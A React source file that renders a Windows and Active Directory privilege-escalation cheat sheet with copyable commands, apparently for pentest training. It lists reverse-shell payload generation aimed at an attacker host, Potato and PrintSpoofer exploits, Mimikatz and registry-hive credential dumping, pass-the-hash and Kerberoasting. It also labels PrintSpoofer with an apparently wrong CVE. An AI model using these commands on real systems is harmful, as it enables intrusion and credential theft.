import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaTerminal, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const WindowsPrivEsc = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided Privilege Escalation Walkthrough',
      content: [
        {
          type: 'markdown',
          value: 'Follow this step-by-step chain to escalate privileges on a Windows system. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. System & User Recon',
          description: 'Gather basic system and user info to identify potential attack vectors.',
          commands: [
            { value: 'systeminfo', description: 'Detailed system information' },
            { value: 'whoami /all', description: 'Current user, groups, privileges' },
            { value: 'net localgroup administrators', description: 'Local administrators group' }
          ]
        },
        {
          type: 'step',
          title: '2. Service & Scheduled Task Abuse',
          description: 'Find vulnerable services or scheduled tasks that can be exploited for privilege escalation.',
          commands: [
            { value: 'sc query state= all', description: 'List all services' },
            { value: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v "\""', description: 'Unquoted service paths (privesc)' },
            { value: 'schtasks /query /fo LIST /v', description: 'All scheduled tasks (verbose)' }
          ]
        },
        {
          type: 'step',
          title: '3. Token Impersonation & Potato Attacks',
          description: 'Check for impersonation privileges and exploit with Potato attacks if possible.',
          commands: [
            { value: 'whoami /priv | findstr /i "Impersonate"', description: 'Check for SeImpersonatePrivilege' },
            { value: '.\\RoguePotato.exe -r <attacker_ip> -e "C:\\Windows\\System32\\cmd.exe" -l 9999', description: 'RoguePotato exploit (get SYSTEM shell)' }
          ]
        },
        {
          type: 'step',
          title: '4. AlwaysInstallElevated',
          description: 'Abuse Windows Installer for privilege escalation if AlwaysInstallElevated is enabled.',
          commands: [
            { value: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKCU)' },
            { value: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKLM)' },
            { value: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o setup.msi', description: 'Generate malicious MSI' },
            { value: 'msiexec /quiet /qn /i setup.msi', description: 'Install MSI as SYSTEM' }
          ]
        },
        {
          type: 'step',
          title: '5. Exploit & Escalate',
          description: 'Use a discovered vector to gain SYSTEM. Example: Exploit a vulnerable service or use a Potato attack.',
          commands: [
            { value: 'net localgroup administrators', description: 'Check if you are now an administrator' },
            { value: 'whoami', description: 'Check your current privileges' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, re-check your privileges with `whoami` and `net localgroup administrators`. Document your findings!'
        }
      ]
    },
    {
      id: 'enumeration',
      title: 'System Enumeration',
      content: [
        {
          type: 'markdown',
          value: `#### Basic System Info\nQuick overview of the Windows system:`
        },
        { type: 'command', value: 'systeminfo', description: 'Detailed system information' },
        { type: 'command', value: 'hostname', description: 'Computer name' },
        { type: 'command', value: 'ver', description: 'Windows version' },
        { type: 'command', value: 'wmic os get Caption,Version,BuildNumber,OSArchitecture', description: 'OS version and architecture' },
        {
          type: 'markdown',
          value: `#### User & Privilege Info\nFind out who you are and what you can do:`
        },
        { type: 'command', value: 'whoami', description: 'Current username' },
        { type: 'command', value: 'whoami /groups', description: 'Groups for current user' },
        { type: 'command', value: 'whoami /priv', description: 'Current user privileges' },
        { type: 'command', value: 'net user', description: 'List all users' },
        { type: 'command', value: 'net localgroup administrators', description: 'Local administrators group' },
        { type: 'command', value: 'net accounts', description: 'Password policy' },
        {
          type: 'markdown',
          value: `#### Services, Processes & Scheduled Tasks\nLook for misconfigurations and privilege escalation vectors:`
        },
        { type: 'command', value: 'tasklist /svc', description: 'Running processes with services' },
        { type: 'command', value: 'netstat -ano', description: 'Listening ports with PIDs' },
        { type: 'command', value: 'sc query state= all', description: 'All services' },
        { type: 'command', value: 'schtasks /query /fo LIST /v', description: 'All scheduled tasks (verbose)' },
        { type: 'command', value: 'wmic product get name,version', description: 'Installed software' },
        { type: 'command', value: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', description: 'Installed patches (hotfixes)' },
        { type: 'command', value: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v "\""', description: 'Unquoted service paths (privesc)' },
        {
          type: 'markdown',
          value: `**Tip:** Use [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) or [Seatbelt](https://github.com/GhostPack/Seatbelt) for automated enumeration.`
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Techniques',
      content: [
        {
          type: 'markdown',
          value: `#### Token Impersonation & Potato Attacks\nEscalate privileges by abusing impersonation tokens:`
        },
        { type: 'command', value: 'whoami /priv | findstr /i "Impersonate"', description: 'Check for SeImpersonatePrivilege' },
        { type: 'command', value: '.\\RoguePotato.exe -r <attacker_ip> -e "C:\\Windows\\System32\\cmd.exe" -l 9999', description: 'RoguePotato exploit (get SYSTEM shell)' },
        {
          type: 'markdown',
          value: `#### DLL Hijacking\nAbuse DLL search order to load malicious code:`
        },
        { type: 'command', value: 'procmon.exe (Filter: Result is NAME NOT FOUND)', description: 'Find missing DLLs (Procmon)' },
        { type: 'command', value: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o hijack.dll', description: 'Generate malicious DLL' },
        {
          type: 'markdown',
          value: `#### PrintSpoofer (CVE-2020-1337)\nExploit Print Spooler for privilege escalation:`
        },
        { type: 'command', value: '.\\PrintSpoofer.exe -c "cmd /c net localgroup administrators <user> /add"', description: 'Add user to Administrators via PrintSpoofer' },
        {
          type: 'markdown',
          value: `#### AlwaysInstallElevated\nAbuse Windows Installer for privilege escalation:`
        },
        { type: 'command', value: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKCU)' },
        { type: 'command', value: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKLM)' },
        { type: 'command', value: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o setup.msi', description: 'Generate malicious MSI' },
        { type: 'command', value: 'msiexec /quiet /qn /i setup.msi', description: 'Install MSI as SYSTEM' },
        {
          type: 'markdown',
          value: `**Tip:** Use [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) for automated privesc checks.`
        }
      ]
    },
    {
      id: 'post-exploitation',
      title: 'Post-Exploitation',
      content: [
        {
          type: 'markdown',
          value: `#### Credential Dumping\nExtract credentials and secrets after privilege escalation:`
        },
        { type: 'command', value: 'sekurlsa::logonpasswords', description: 'Dump credentials with Mimikatz' },
        { type: 'command', value: 'reg save HKLM\\SAM sam.save', description: 'Dump SAM database' },
        { type: 'command', value: 'reg save HKLM\\SYSTEM system.save', description: 'Dump SYSTEM hive' },
        { type: 'command', value: 'reg save HKLM\\SECURITY security.save', description: 'Dump LSA secrets' },
        {
          type: 'markdown',
          value: `#### Lateral Movement\nMove laterally in the network after gaining credentials:`
        },
        { type: 'command', value: 'wmic /node:<target> process call create "cmd /c <command>"', description: 'WMI remote command execution' },
        { type: 'command', value: 'Invoke-Command -ComputerName <target> -ScriptBlock { <commands> }', description: 'PowerShell Remoting' },
        { type: 'command', value: '.\\pth-winexe -U <user>%<hash> //<target> cmd', description: 'Pass-the-Hash with pth-winexe' },
        {
          type: 'markdown',
          value: `**Tip:** Use [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) for post-exploitation and lateral movement.`
        }
      ]
    },
    {
      id: 'active-directory',
      title: 'Active Directory',
      content: [
        {
          type: 'markdown',
          value: '#### Guided AD Attack Chain Walkthrough\nStep-by-step example of a typical AD attack chain. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. AD Enumeration',
          description: 'Enumerate users, groups, computers, and trust relationships.',
          commands: [
            { value: 'net user /domain', description: 'List all domain users' },
            { value: 'net group /domain', description: 'List all domain groups' },
            { value: 'SharpHound.exe -c All', description: 'BloodHound collector (full AD recon)' }
          ]
        },
        {
          type: 'step',
          title: '2. Kerberos Attacks',
          description: 'Perform AS-REP Roasting and Kerberoasting to extract service account hashes.',
          commands: [
            { value: 'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname', description: 'AS-REP Roasting (PowerView)' },
            { value: 'Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.com"', description: 'Kerberoasting (PowerShell)' }
          ]
        },
        {
          type: 'step',
          title: '3. Crack Hashes & Lateral Movement',
          description: 'Crack Kerberos hashes and use credentials for lateral movement.',
          commands: [
            { value: 'hashcat -m 13100 hash.txt wordlist.txt', description: 'Crack Kerberos hashes with hashcat' },
            { value: 'wmic /node:<target> process call create "cmd /c <command>"', description: 'WMI remote command execution' },
            { value: 'Invoke-Command -ComputerName <target> -ScriptBlock { <commands> }', description: 'PowerShell Remoting' }
          ]
        },
        {
          type: 'step',
          title: '4. Domain Privilege Escalation',
          description: 'Escalate to domain admin using discovered credentials or attack paths.',
          commands: [
            { value: 'net group "Domain Admins" /domain', description: 'List domain admins' },
            { value: 'net user <user> /domain', description: 'Check privileges of compromised user' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** Use BloodHound to visualize attack paths and PowerView for in-depth AD recon.'
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaTerminal /> Windows Privilege Escalation Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive Windows privilege escalation techniques covering local and 
          Active Directory environments with modern exploitation methods.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'command') {
                      return (
                        <div key={index} className="content-item">
                          <div className="command-item">
                            <div className="command-header">
                              <code>{item.value}</code>
                              <button
                                onClick={() => handleCopy(item.value)}
                                className="copy-button small"
                              >
                                Copy
                              </button>
                            </div>
                            <p className="command-description">{item.description}</p>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'markdown') {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>
                              {item.value}
                            </ReactMarkdown>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else {
                      return null;
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default WindowsPrivEsc;